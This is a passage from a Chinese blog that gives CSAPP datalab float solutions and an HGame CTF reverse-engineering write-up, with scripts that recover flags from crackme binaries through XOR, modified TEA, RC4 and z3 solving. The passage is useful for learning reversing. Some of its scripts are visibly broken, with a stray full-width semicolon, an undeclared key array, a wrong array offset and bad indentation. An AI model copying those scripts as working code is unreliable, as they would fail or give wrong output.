class="hljs-keyword">if</span>(expr == <span class="hljs-number">0</span>)&#123;<br><span class="hljs-comment">// E = exp -127 = -127</span><br>    frac &lt;&lt;= <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> ( s &lt;&lt; <span class="hljs-number">31</span> ) | frac ;<br>&#125;<br><br><span class="hljs-comment">//输入为规格化的数</span><br><span class="hljs-built_in">exp</span> ++;<br><span class="hljs-comment">// E = exp - 127</span><br><span class="hljs-keyword">return</span> ( s &lt;&lt; <span class="hljs-number">31</span> ) | ( <span class="hljs-built_in">exp</span> &lt;&lt; <span class="hljs-number">23</span> ) | frac ;<br></code></pre></td></tr></table></figure><h2 id="第十二题">第十二题</h2><p>题目要求将浮点数转换为整数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>与上面一个题相似，我们分别去取出其<code>s</code>、<code>exp</code>、<code>frac</code>，便有如下计算过程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> s = uf &gt;&gt; <span class="hljs-number">31</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-built_in">exp</span> = (uf &gt;&gt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0xFF</span>;<br><span class="hljs-keyword">unsigned</span> frac = (uf &amp; <span class="hljs-number">0x7FFFFF</span>);<br><br><span class="hljs-comment">//输入为0 </span><br><span class="hljs-keyword">if</span>( <span class="hljs-built_in">exp</span> == <span class="hljs-number">0</span> &amp;&amp; frac ==<span class="hljs-number">0</span> )&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输入为无穷或者不是一个数</span><br><span class="hljs-keyword">if</span>( <span class="hljs-built_in">exp</span> == <span class="hljs-number">0xFF</span> )&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>&#125;<br><br><span class="hljs-comment">//输入为非规格化的数</span><br><span class="hljs-keyword">if</span>( <span class="hljs-built_in">exp</span> == <span class="hljs-number">0</span> )&#123;<br><span class="hljs-comment">//E = 1 - 127 = -126</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//输入为规格化的数</span><br><span class="hljs-keyword">int</span> E = <span class="hljs-built_in">exp</span> - <span class="hljs-number">127</span>;<br>frac = frac  | ( <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span> );<br><br><span class="hljs-keyword">if</span>( E &gt; <span class="hljs-number">31</span> )&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( E &lt; <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//M * 2^E</span><br><span class="hljs-keyword">if</span>( E &gt;= <span class="hljs-number">23</span> )&#123;<br>    frac &lt;&lt;= ( E - <span class="hljs-number">23</span>); <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>frac &gt;&gt;= ( <span class="hljs-number">23</span> - E );<br>&#125;<br><br><span class="hljs-keyword">if</span>(s)&#123;<br><span class="hljs-keyword">return</span> ~ frac + <span class="hljs-number">1</span> ;<br>&#125;<br><span class="hljs-keyword">return</span> frac;<br></code></pre></td></tr></table></figure><h2 id="第十三题">第十三题</h2><p>题目要求返回对应数等于 2 的<code>x</code>次阶乘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsigned value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">floatPower2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于这个题目我们需要先找到对应的范围来进行判断</p><p>对于非规格化的数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lowerbound</span>: <span class="hljs-number">2</span>^ -<span class="hljs-number">149</span><br><span class="hljs-attribute">upperbound</span>: <span class="hljs-number">2</span>^ -<span class="hljs-number">126</span> ( <span class="hljs-number">2</span>^ -<span class="hljs-number">1</span> + <span class="hljs-number">2</span>^ -<span class="hljs-number">2</span> + ... + <span class="hljs-number">2</span>^ -<span class="hljs-number">23</span> )<br></code></pre></td></tr></table></figure><p>对于规格化的数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lowerbound</span>: <span class="hljs-number">2</span>^ -<span class="hljs-number">126</span><br><span class="hljs-attribute">upperbound</span>: <span class="hljs-number">2</span>^ <span class="hljs-number">127</span> <br></code></pre></td></tr></table></figure><p>对此我们可以写出如下操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>( x &lt; <span class="hljs-number">-149</span> )&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( x &lt; <span class="hljs-number">-126</span> )&#123;<br><span class="hljs-comment">//E = x</span><br><span class="hljs-comment">//E = 1 - 127 = -126 </span><br>    <span class="hljs-keyword">int</span> shift = <span class="hljs-number">23</span> + ( x + <span class="hljs-number">126</span> );<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; shift;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>( x &lt;= <span class="hljs-number">127</span> )&#123;<br><span class="hljs-comment">//x= exp -bias</span><br><span class="hljs-keyword">int</span> <span class="hljs-built_in">exp</span> = x + <span class="hljs-number">127</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">exp</span> &lt;&lt;<span class="hljs-number">23</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> ( <span class="hljs-number">0XFF</span> ) &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HGame 逆向复现</title>
    <link href="/2022/03/14/HGame/"/>
    <url>/2022/03/14/HGame/</url>
    
    <content type="html"><![CDATA[<h1>HGame</h1><h2 id="Reverse">Reverse</h2><h3 id="eazyasm">eazyasm</h3><p>根据题目可以知道，题目由汇编编写而来，直接拖入<code>ida</code> ：</p><p><img src="https://static01.imgkr.com/temp/a62dd1ccd8ab4197b12d94819309767f.png" alt=""></p><p>可以看到关键部分（如上图）</p><p>程序将<code>[si]</code>先左移4位后再右移4位，把两个得到的结果相加，最后于<code>0x17</code>进行异或之后与一个字符比较，如此循环28次。</p><p>在汇编里不难发现对比的字符串：</p><p><img src="https://static01.imgkr.com/temp/8e08de7ed2a24039b28deeaad9d8c0ca.png" alt=""></p><p>因此我们可以编写对应的解题脚本了（c++）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> data[<span class="hljs-number">28</span>] = &#123;<br><span class="hljs-number">0x91</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xE1</span>,<br><span class="hljs-number">0xE2</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x17</span><br>&#125;;<br><span class="hljs-keyword">char</span> a,b; <br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">28</span>;i++)&#123;<br>data[i]^=<span class="hljs-number">23</span>;<br>a = data[i]&gt;&gt;<span class="hljs-number">4</span>;<br>b = data[i]&amp;<span class="hljs-number">0xf</span>;<br>b=b&lt;&lt;<span class="hljs-number">4</span>; <br>cout&lt;&lt;(<span class="hljs-keyword">char</span>)(a+b);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="creakme">creakme</h3><p>直接拖入<code>ida</code>进行反编译</p><p>乍一看像是有一个<code>Base64</code>，但实际上是<code>Tea</code>加密的魔改，在每次加密过程中多异或了一次<code>sum</code></p><p><img src="https://static01.imgkr.com/temp/c8573f8a1cf544b79c1257fb7efd5bd0.png" alt=""></p><p>同时我们在编写脚本的时候要注意端序的问题，避免出错</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decrypt</span> <span class="hljs-params">(<span class="hljs-keyword">uint32_t</span>* v, <span class="hljs-keyword">uint32_t</span>* k)</span> </span>&#123;<br>    <span class="hljs-keyword">uint32_t</span> delta=<span class="hljs-number">0x12345678</span>;<br>    <span class="hljs-keyword">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=delta * <span class="hljs-number">32</span>, i;<br>    <span class="hljs-keyword">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++) &#123;<br>        v1 -= sum ^ ((v0&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        v0 -= sum ^ ((v1&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        sum -= delta;<br>    &#125;<br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">uint32_t</span> v[]=&#123;<span class="hljs-number">1222194312u</span>, <span class="hljs-number">51123276u</span>, <span class="hljs-number">1391163586u</span>, <span class="hljs-number">3986482669u</span>, <span class="hljs-number">2921328102u</span>, <span class="hljs-number">3126465133u</span>, <span class="hljs-number">3482485930u</span>,  <span class="hljs-number">1709241059u</span>&#125;；<br>    k[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0x44434241</span>,<span class="hljs-number">0x48474645</span>,<span class="hljs-number">0x4c4b4a49</span>,<span class="hljs-number">0x504f4e4d</span>&#125;;<br>    <span class="hljs-built_in">decrypt</span>(v, k);<br>    <span class="hljs-built_in">decrypt</span>(v + <span class="hljs-number">2</span>, k);<br>    <span class="hljs-built_in">decrypt</span>(v + <span class="hljs-number">4</span>, k);<br>    <span class="hljs-built_in">decrypt</span>(v + <span class="hljs-number">8</span>, k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, v);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="Flag-Checker">Flag Checker</h3><p>把<code>apk</code>文件直接拖入<code>Jeb</code></p><p><img src="https://static01.imgkr.com/temp/5f0332f457724065bf5aab3691c48773.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/0ff056b863d24f18b1915fc9965934c3.png" alt=""></p><p>可以明显的看到函数调用了一个<code>RC4</code>、<code>Base64</code>，程序将输入的字符串先以密钥<code>carol</code>进行<code>RC4</code>加密之后把加密后的数据转换为<code>Base64</code>与后面一个字符串进行比较。</p><p>于是我们可以写对应脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><br>cipher = b64decode(<span class="hljs-string">b&#x27;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#x27;</span>)<br><br>key = <span class="hljs-string">b&#x27;carol&#x27;</span><br>rc4 = ARC4.new(key)<br><br>rc4.decrypt(cipher)<br><span class="hljs-comment"># b&#x27;hgame&#123;weLC0ME_To-tHE_WORLD_oF-AnDr0|D&#125;&#x27;</span><br><br></code></pre></td></tr></table></figure><h3 id="猫头鹰是不是猫">猫头鹰是不是猫</h3><p>拖入<code>ida</code></p><p><img src="https://static01.imgkr.com/temp/ea769ec9cd0c447cb9b25c1c46d5ea69.png" alt=""></p><p>可以简单的看到其逆向关键在于<code>sub_1537</code>这个函数，点进去</p><p><img src="https://static01.imgkr.com/temp/3ef6e6d703184d0e97798fb5e97e9d13.png" alt=""></p><p>我们发现核心函数就是<code>sub_1347</code>，继续深入进去</p><p><img src="https://static01.imgkr.com/temp/cd7fedc590ae4493abcc43828d14eae9.png" alt=""></p><p>函数不加修改的话可能会有一些难看，稍微修改一下就成上图啦，不难看出来函数主要在进行矩阵的乘法运算由输入的<code>64</code>位字符构成的矩阵与上面的<code>deword_4140</code>、<code>deword_8140</code>两个<code>64*64</code>的矩阵进行乘法运算，之后将得到的值与<code>unk_4040</code>进行比较。</p><p>因此我们可以写一个<code>z3</code>进行约束求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>cat = [] <span class="hljs-comment">#cat和owl的数据过于庞大，就不打出来了，都是DWORD型的，每个数字32位；</span><br>owl = []<br>data = [] <span class="hljs-comment">#这是cmp已知数据；</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):                         <span class="hljs-comment">#owl和cat每个数除10；</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        cat[(<span class="hljs-number">64</span>*i+j)] = cat[(<span class="hljs-number">64</span>*i+j)] / <span class="hljs-number">10</span>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        owl[(<span class="hljs-number">64</span>*i+j)] = owl[(<span class="hljs-number">64</span>*i+j)] / <span class="hljs-number">10</span><br><br>s = Solver()<br>so = Solver()<br>out = [Int(<span class="hljs-string">&#x27;out[%d]&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)] <span class="hljs-comment">#z3设置未知数；</span><br>o = [Int(<span class="hljs-string">&#x27;o[%d]&#x27;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):                           <span class="hljs-comment">#解第一组owl的输入方程，有解就会输出64个解；</span><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span> + out[j] * owl[(<span class="hljs-number">64</span>*j+i)]<br>    s.add(data[i] == <span class="hljs-built_in">sum</span>)<br><span class="hljs-keyword">if</span>(s.check()==sat):<br>    <span class="hljs-built_in">print</span>(s.model())<br><br>out = [<span class="hljs-number">0</span>] * <span class="hljs-number">64</span><br>out = [] <span class="hljs-comment">#输出后的数据再写入，进行第二轮运算；</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):                          <span class="hljs-comment">#解第二组cat的输入方程，有解就会输出64个解；</span><br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        <span class="hljs-built_in">sum</span> = <span class="hljs-built_in">sum</span> + o[j] * cat[(<span class="hljs-number">64</span>*j+i)]<br>    so.add(out[i] == <span class="hljs-built_in">sum</span>)<br><span class="hljs-keyword">if</span>(so.check()==sat):<br><span class="hljs-built_in">int</span>(so.model())<br><br>o = [<span class="hljs-number">0</span>] * <span class="hljs-number">64</span><br>o = [] <span class="hljs-comment">#输出后的数据再写入，方便直接显示flag；</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):       <span class="hljs-comment">#将运算后的数据换成ascii码输出最后的字符串；</span><br>    o[i] = <span class="hljs-built_in">chr</span>(o[i])<br>o = <span class="hljs-string">&#x27;&#x27;</span>.join(o)<br><span class="hljs-built_in">print</span>(o)<br></code></pre></td></tr></table></figure><h3 id="xD-MAZE">xD MAZE</h3><p>题目描述是走迷宫，那我们只需要找到对应地图，按照对应方式进行走动就可以了</p><p><img src="https://s3.bmp.ovh/imgs/2022/02/e1852231de4e2687.png" alt=""></p><p>我们导出对应地图按<code>64*64</code>进行输出，之后按照对应规则行走就可以啦</p><p><img src="https://s3.bmp.ovh/imgs/2022/02/655b37ffd81caa85.png" alt=""></p><p>走出迷宫所需要的输入套上<code>hgame&#123;&#125;</code>就是<code>flag</code>啦</p><h3 id="upx-magic-0">upx magic 0</h3><p>题目描述有<code>upx</code>壳但是实际上并没有，直接拖入<code>ida</code>进行反编译</p><p>通过字符串定位我们可以找到对应加密部分</p><p><img src="https://s3.bmp.ovh/imgs/2022/02/9d502c5f029440ee.png" alt=""></p><p>于是可以直接通过爆破的方式来解决这个题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">v14 = [<span class="hljs-number">0x8d68</span>, <span class="hljs-number">0x9d49</span>, <span class="hljs-number">0x2a12</span>, <span class="hljs-number">0xab1a</span>, <span class="hljs-number">0xcbdc</span>, <span class="hljs-number">0xb92b</span>, <span class="hljs-number">0x2e32</span>, <span class="hljs-number">0x9f59</span>,<br>       <span class="hljs-number">0xddcd</span>, <span class="hljs-number">0x9d49</span>, <span class="hljs-number">0xa90a</span>, <span class="hljs-number">0xe70</span>, <span class="hljs-number">0xf5cf</span>, <span class="hljs-number">0xa50</span>, <span class="hljs-number">0x5af5</span>, <span class="hljs-number">0xff9f</span>, <span class="hljs-number">0x9f59</span>, <span class="hljs-number">0xbd0b</span>,<br>       <span class="hljs-number">0x58e5</span>, <span class="hljs-number">0x3823</span>, <span class="hljs-number">0xbf1b</span>, <span class="hljs-number">0x78a7</span>, <span class="hljs-number">0xab1a</span>, <span class="hljs-number">0x48c4</span>, <span class="hljs-number">0xa90a</span>, <span class="hljs-number">0x2c22</span>, <span class="hljs-number">0x9f59</span>, <span class="hljs-number">0x5cc5</span>,<br>       <span class="hljs-number">0x5ed5</span>, <span class="hljs-number">0x78a7</span>, <span class="hljs-number">0x2672</span>, <span class="hljs-number">0x5695</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>, <span class="hljs-number">128</span>):<br>        v12 = <span class="hljs-number">0</span><br>        v12 = j &lt;&lt; <span class="hljs-number">8</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span> (v12 &amp; <span class="hljs-number">0x8000</span>) != <span class="hljs-number">0</span>:<br>                v12 = (v12 * <span class="hljs-number">2</span>) ^ <span class="hljs-number">0x1021</span><br>            <span class="hljs-keyword">else</span>:<br>                v12 *= <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> (v12 &amp; <span class="hljs-number">0xffff</span>) == v14[i]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j), end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h3 id="fakeshell">fakeshell</h3><p>我们直接拖入<code>ida</code>，找到关键函数</p><p><img src="https://static01.imgkr.com/temp/62954df6c91b4899b573ec05d9ac7fe1.png" alt=""></p><p><code>rc4_init</code>和<code>rc4_crypt</code>这两个函数需要稍微修改一下，让其变得更加易于阅读</p><p><img src="https://static01.imgkr.com/temp/489e94c502334092817858a6e01d74b7.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/bbdf851c6bf1485c80d388b4356cab7a.png" alt=""></p><p>不难发现这两个函数都是标准的<code>RC4</code>加密，但是我们对最开始的密钥<code>happyhg4me!</code>进行交叉引用会发现后期会被修改成<code>w0wy0ugot1t</code></p><p>所以在编写脚本时需要注意一下密钥，同时加密后的数据也要注意按小端序来进行计算。</p><p>脚本如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 